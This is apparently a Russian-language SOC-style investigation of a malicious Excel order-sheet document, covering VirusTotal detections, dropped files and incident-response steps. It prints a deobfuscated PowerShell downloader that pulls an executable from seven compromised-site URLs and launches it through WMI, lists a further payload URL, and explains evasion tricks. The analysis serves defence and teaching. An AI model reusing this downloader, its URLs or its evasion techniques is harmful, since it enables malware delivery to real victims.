## Расследование

### 1. Проверка хэша на VirusTotal

```
Детекты:       45/75
Threat label:  trojan.acao/docdl
Категории:     trojan, dropper, downloader
Семейства:     acao, docdl, valyria
Теги:          auto-open, macros, macro-run-file, detect-debug-environment,
               long-sleeps, calls-wmi, exploit, cve-2017-11882
```

Встроенный в VirusTotal Crowdsourced AI code insight по макросу независимо подтвердил вредоносность: обфускация переменных, декодирование Base64, использование `ShellExecute`/`CreateObject`, скачивание и запуск внешнего файла, self-replication через `Auto_Open`.

Тег `cve-2017-11882` (уязвимость Equation Editor) указывает на возможный второй, эксплойт-based вектор заражения в дополнение к макросу — типичная практика для maldoc-кампаний подстраховывать доставку несколькими механизмами.

### 2. Статический анализ макроса

Документ содержит процедуру **`Auto_Open`** — специальную VBA-функцию, которая выполняется автоматически при открытии файла, без каких-либо действий пользователя кроме нажатия "Enable Content". Внутри неё — обфусцированный вызов PowerShell через `-EncodedCommand`.

Декодирование (Base64 → **UTF-16LE**, не UTF-8 — стандартная кодировка именно для `-EncodedCommand`) и снятие обфускации (мусорные переменные, конкатенация строк для сокрытия имён типов/командлетов, backtick-разрывы вроде `` gE`T-`ITeM ``) дало следующую логику:

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -ItemType Directory ($env:userprofile + "\W9ludan\Avgqkj3\")
$targetPath = $env:userprofile + "\W9ludan\Avgqkj3\Stwk31v.exe"
$wc = New-Object Net.WebClient
$urls = @(
  "http://tudorinvest.com/wp-admin/rGtnUb5f/",
  "http://dp-womenbasket.com/wp-admin/Li/",
  "http://stylefix.co/guillotine-cross/CTRNOQ/",
  "http://ardos.com.br/simulador/bPNx/",
  "http://drtheurelplasticsurgery.com/generalo/rhrhflv92/",
  "http://bodyinnovation.co.za/wp-content/2ssHvi/",
  "http://nomadco.es/wp-admin/MvwVHCG/"
)
foreach ($url in $urls) {
    try {
        $wc.downloadFile($url, $targetPath)
        if ((Get-Item $targetPath).Length -ge 26346) {
            ([wmiclass]'win32_Process').Create($targetPath)
            break
        }
    } catch {}
}
```

Ключевые моменты:
- **Fallback-список из 7 URL** — все на скомпрометированных легитимных WordPress-сайтах (пути `wp-admin/`, `wp-content/`), а не на инфраструктуре, зарегистрированной атакующим напрямую.
- **Проверка размера файла (`≥ 26346` байт)** — защита от собственного отказа: если ссылка мертва и отдаёт страницу ошибки, скрипт молча переходит к следующей.
- **Запуск через `Win32_Process.Create` (WMI)**, а не обычный дочерний процесс — приём для снижения детекта по поведенческим правилам, завязанным на родительско-дочерние связи процессов.

### 3. Динамический анализ и dropped files (VirusTotal)

Поведенческий отчёт VirusTotal при детонации сэмпла зафиксировал контакт с адресом, **не входившим** в семь URL из макроса:

```
https://multiwaretecnologia.com.br/js/Podaliri4.exe
VT: 9/91 детектов
```

Домен построен по той же схеме, что и семь стейджеров (путь `/js/` на, вероятно, тоже скомпрометированном легитимном сайте) — расхождение со статически найденным списком объясняется тем, что VT детонировал сэмпл в момент, когда актуальной оказалась другая версия инфраструктуры (URL в таких кампаниях меняются/протухают быстро).

Разбор dropped files документа выявил дополнительные вредоносные компоненты внутри самого XLSM:

| Файл | VT | Threat label |
|---|---|---|
| `script1.vbs` (внутри `asc.txt`) | 22/76 | `trojan.sbadur` — embedded VBA-скрипт второй стадии |
| `ORDER SHEET _ SPEC.xlsm_xx` | 30/76 | `trojan.valyria/leonem` |
| `ORDER SHEET _ SPEC.xlsm_q` (HTML) | 24/76 | `trojan.cryxos/runner` |
| `image1.emf` | 1/74 | не помечен конкретным семейством — вероятно декоративная картинка приманки |

Это подтверждает, что заражение **многоступенчатое**, а не однократный дроппер: сам документ уже несёт вредоносные компоненты второй стадии, независимо от того, что дальше скачивает PowerShell.

1. Заблокировать подтверждённый payload-адрес `multiwaretecnologia.com.br` и семь доменов-стейджеров на периметре.
2. Занести хэш исходного файла и хэши dropped-компонентов в блок-лист EDR.
3. Изолировать хост "София" (`172.16.17.56`) до подтверждения факта исполнения/закрепления.
4. Проверить логи процессов/командной строки — реально ли отработал PowerShell, или пользователь только открыл документ без включения макроса.
5. Проверить почтовые логи на предмет доставки того же вложения другим получателям.

## Выводы

- `Auto_Open` — зарезервированное имя VBA-процедуры, которое Word/Excel запускает автоматически при открытии файла. Единственный барьер для атакующего — предупреждение "Enable Content", на провокацию клика по которому и рассчитана социальная инженерия документа (тема "лист заказа и спецификация" — деловая приманка).
- Fallback-список из нескольких URL в даунлоадере — распространённый приём устойчивости кампании: если один хостинг снесли/забанили, скрипт молча переходит к следующему без дополнительного взаимодействия с жертвой.
- Проверка размера скачанного файла перед исполнением — простой, но эффективный способ отличить настоящий payload от страницы ошибки/заглушки, если хостинг уже недоступен.
- Запуск через WMI (`Win32_Process.Create`) вместо прямого дочернего процесса — стоит закладывать в детект-правила: EDR-политики, завязанные только на "PowerShell породил EXE", такое пропустят.
- Статический список URL из макроса и то, что реально было контакнуто при динамической детонации, могут не совпадать — инфраструктура таких кампаний обновляется быстро. Для отчёта важно фиксировать оба набора данных как связанные, но не идентичные, а не считать один источник избыточным.
- Вредоносность документа стоит проверять не только по итоговому payload, но и по dropped-компонентам самого файла — в этом кейсе почти половина обнаруженных вредоносных элементов (VBA-скрипт второй стадии, внутренние XML/HTML-части) была внутри самого XLSM, а не скачивалась отдельно.
